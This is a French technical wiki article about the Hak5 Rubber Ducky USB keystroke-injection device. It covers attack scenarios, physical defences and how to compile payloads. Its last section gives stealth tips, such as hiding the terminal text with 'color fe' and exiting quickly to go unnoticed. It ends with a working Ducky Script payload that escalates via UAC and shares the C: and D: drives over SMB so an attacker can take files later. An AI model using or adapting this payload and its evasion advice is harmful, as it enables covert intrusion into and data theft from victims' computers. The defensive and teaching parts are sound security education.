---
title: Rubber Ducky
type: WIKI
categories:
  - system
  - security
description: Configuration d'un équipement Rubber Ducky.
author: Flavien PERIER <perier@flavien.io>
date: 2021-10-31 18:00
---

Je tiens avant toute chose à préciser que cet article est rédigé uniquement à but pédagogique. Je n'ai jamais projeté d'attaquer quelque entreprise que ce soit. Si vos intentions en vous rendant sur ce site sont malveillantes je vous invite à consulter [l'article 323-1 du Code pénal](https://www.legifrance.gouv.fr/codes/article_lc/LEGIARTI000030939438/) qui stipule que les intrusions dans un système informatique peuvent vous couter jusqu'a deux ans d'emprisonnement et 60 000 € d'amende. Cela étant dit, je décline toute responsabilité de ce que vous ferez du contenu de cet article.

La [Rubber Ducky](https://www.usbrubberducky.com/) est un dispositif d'attaque physique vendu par [Hak5](https://hak5.org/). Extérieurement, elle ressemble à une vulgaire clé USB. Cependant, une fois connectée à un ordinateur elle est reconnue comme un clavier et va pouvoir exécuter une série d'instructions prédéfinie par l'attaquant.

![USB Rubber Ducky](https://medias.flavien.io/articles/rubber-ducky/rubber-ducky.webp)

## Avantage de la conception

Le principal avantage de la Rubber Ducky est qu'elle n'exploite pas des vulnérabilités logicielles, mais s'appuie sur la simulation du hardware d'un clavier physique. Le système d'exploitation n'a donc aucune façon de différencier ce périphérique de n'importe quel autre clavier. La Rubber Ducky est donc complètement indétectable par les antivirus. 

## Vecteurs d'attaque

Il existe de nombreux scénarios d'attaque imaginables avec ce type d'appareil. En voici deux petits exemples :

- Dans le cas où un hacker arriverait à pénétrer physiquement dans les locaux d'une entreprise, ce type d'équipement pourrait lui permettre de gagner du temps dans le cas ou il trouverait, un pc déverrouillé. Il lui suffit de brancher la Rubber Ducky et d'attendre que le script se déroule (généralement seulement quelques secondes).

- Autres scénarios où le hacker n'arriverait pas à accéder aux locaux, il serait envisageable d'abandonner le dispositif dans un lieu fréquenté par les employés de cette entreprise (comme par exemple le parking de l'entreprise). Dans la plupart des cas, la personne qui va trouver le dispositif va le brancher afin de visualiser son contenu. Erreur qui pourrait être fatale et permettre au hacker de s'infiltrer dans le réseau d'une entreprise sans même avoir à y accéder physiquement.

## Comment s'en défendre

Comme nous l'avons vu, une attaque effectuée par une Rubber Ducky est indétectable par nos antivirus. Pour s'en défendre, il faut donc une approche qui ne soit pas logiciel.

La plupart des entreprises interdisent à leurs employés de connecter des clés USB à leurs ordinateurs, mais ne les empêchent pas non plus de le faire... Conclusion, ils ne se privent pas.

Il existe de nombreuses sociétés commercialisant des dispositifs permettant de bloquer l'accès à un port USB comme par exemple, [Lindy](https://lindy.com/fr/technologie/bloqueurs-de-ports/). Ce type de protection permet d'éviter qu'un employé ou un attaquant connecte un périphérique USB non désiré. D'autres, plus extrémistes, détruisent tout simplement les ports USB non utilisés (ce qui est dommage à mon sens quand on peut simplement les verrouiller). Il reste cependant un certain nombre de ports USB qu'on ne peut pas condamner, car utilisés (clavier, souris, webcam...). Si aucun port n'est libre, il est assez peu probable qu'un employé prenne le temps de débrancher un périphérique dont il a besoin afin de connecter la clé USB qu'il vient de trouver. Cependant cela ne va très certainement pas arrêter un hacker s'il en a le temps. Une solution pourrait consister à souder les périphériques branchés au châssis.

Il est cependant évident qu'il n'est pas forcément nécessaire d'en arriver là. Cela dépend de la criticité des informations auxquelles l'employé a accès et du réseau sur lequel il se trouve.

## Comment s'en servir

La première étape consiste à démonter la Rubber Ducky. À l'intérieur ce trouve une carte micros-sd c'est sur cette dernière que nous allons travaillé et pouvoir déposer notre payload.

### Installation de l'environnement

Le langage de la Rubber Ducky (le [Ducky Script](https://docs.hak5.org/hc/en-us/articles/360049449314-Ducky-Script-Command-Reference)) est compilé. Il faut donc utiliser un logiciel afin de transformer notre code en instruction compris par notre équipement.

Il est possible d'utiliser [le compiler en ligne proposée par Hak5](https://shop.hak5.org/pages/ducky-encoder) ou d'installer directement [l'outil java en ligne de commande](https://github.com/hak5darren/USB-Rubber-Ducky/releases/download/v2.6.3/encoder.jar).

Pour utiliser l'outil, il suffit d'utiliser la ligne de commande suivante :

```bash
java -jar encoder.jar -l fr -i script.txt -o inject.bin 
```

Une fois notre code compilé d'une façon ou d'une autre, il suffit de le mettre à la racine de la carte avec le nom `inject.bin`.

### Quelques exemples de scripts

Il existe plusieurs sites qui proposent des scripts déjà tout fait. Il est intéréssent de passer par la afin de s'en inspirer :

- [GitHub de Hak5](https://github.com/hak5/usbrubberducky-payloads)
- [Hacktoday](https://thehacktoday.com/60-best-rubber-ducky-usb-payloads/)

#### Quelques conseils

- Toujours essayer de faire passer le script sur une unique ligne chainer avec des `&&` des `||` et des `;`. Cela permet de débrancher la clé USB au plus tôt. En effet une fois la ligne tapée et lancée, le payload va poursuivre son exécution même si l'on débranche la clé.

- Sur Windows, préférez l'utilisation de CMD à PowerShell (si on utilise des instructions PowerShell, les exécuter depuis le CMD). La raison est que CMD démarre beaucoup plus rapidement et que par extension, notre script à moins de chance de commencer à écrire avant que le terminal soit chargé.

- Bien penser à commencer le script par `color fe`. Cela va passer la couleur de CMD en Jaune claire sur blanc (rendant le déroulement illisible par un humain). Le temps que l'utilisateur comprenne ce qui se passe, il sera déjà trop tard.

- Terminer le script par un exit afin de fermer le terminal après le méfait et donc passer plus facilement inaperçu.

#### Partage des disques dur sur le réseau

Un premier petit payload, qui est en réalité assez inoffensif pour les entreprises dans la mesure ou le script demande un accès administrateur (qui n'est en général pas offert aux employés).

Le but est ici de transformer les disques `C:` et `D:` d'un Windows en lecteurs réseaux. L'attaquant n'aura par la suite qu'à récupérer les fichiers qu'ils contiennent. Cela implique cependant que l'attaquant ait accès au réseau et connaisse l'IP de ça vctime.

```txt
REM Flavien PERIER <perier@flavien.io>
DEFAULT_DELAY 300

DELAY 1000
GUI r
STRING cmd
CTRL-SHIFT ENTER
DELAY 700
TAB
TAB
ENTER

STRING color fe && powershell "New-SmbShare -Name C -Path C:\ -FullAccess administrateur ; New-SmbShare -Name D -Path D:\ -FullAccess administrateur" || exit
ENTER
```
